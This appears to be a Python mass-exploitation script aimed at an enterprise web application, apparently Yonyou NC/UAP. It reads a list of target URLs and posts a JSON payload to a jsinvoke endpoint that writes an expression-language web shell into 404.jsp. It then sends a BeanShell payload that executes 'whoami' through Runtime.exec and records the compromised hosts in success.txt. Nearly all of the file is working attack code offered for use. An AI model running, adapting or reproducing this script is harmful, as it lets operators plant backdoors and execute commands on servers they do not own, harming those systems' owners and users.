import argparse
from time import time

import requests

print('''
 _    _____                                     
| |__|___ / _ __   __ _ _   _  __ _ _ __   __ _ 
| '_ \ |_ \| '_ \ / _` | | | |/ _` | '_ \ / _` |
| |_) |__) | | | | (_| | |_| | (_| | | | | (_| |
|_.__/____/|_| |_|\__, |\__,_|\__,_|_| |_|\__, |
                  |___/                   |___/ 
脚本，启动！！！！
''')

parser = argparse.ArgumentParser()
parser.add_argument('-f', type=str, default=None, required=False,
                    help='输入文件路径')
parser.add_argument('-u', type=str, default=None, required=False,
                    help='输入url')
args = parser.parse_args()

urls = []

if args.f:
    with open(args.f, 'r') as f:
        lines = f.readlines()
        urls = [line.strip() for line in lines if not line.startswith('https')]
elif args.u:
    urls.append(args.u)
else:
    parser.print_help()
    exit()

path_1 = "/uapjs/jsinvoke?action=invoke"
path_2 = "/404.jsp?error=bsh.Interpreter"

payload_1 = {
    "serviceName": "nc.itf.iufo.IBaseSPService",
    "methodName": "saveXStreamConfig",
    "parameterTypes": [
        "java.lang.Object",
        "java.lang.String"
    ],
    "parameters": [
        "${param.getClass().forName(param.error).newInstance().eval(param.cmd)}",
        "webapps/nc_web/404.jsp"
    ]
}

payload_2 = {
    'cmd': 'org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("whoami").getInputStream())',
}

success_targets = []
print("[+]任务开始.....")
start = time()

for url in urls:
    target = url
    allow_url = []
    try:
        response = requests.get(url=target, timeout=3, verify=False)
        if response.status_code == 200:
            response_1 = requests.post(url=f"{target}{path_1}", json=payload_1, timeout=3)
        if response_1.status_code in [200, 404]:
            print(f"{target}{path_2}")
            response_2 = requests.post(url=f"{target}{path_2}", data=payload_2, timeout=3)
            if "出错" in response_2.text:
                pass
            else:
                success_targets.append(url)
    except Exception as e:
        continue

end = time()
print('任务完成,用时%ds.' % (end - start))

with open('success.txt', 'w') as f:
    for target in success_targets:
        f.write(target + '\n')
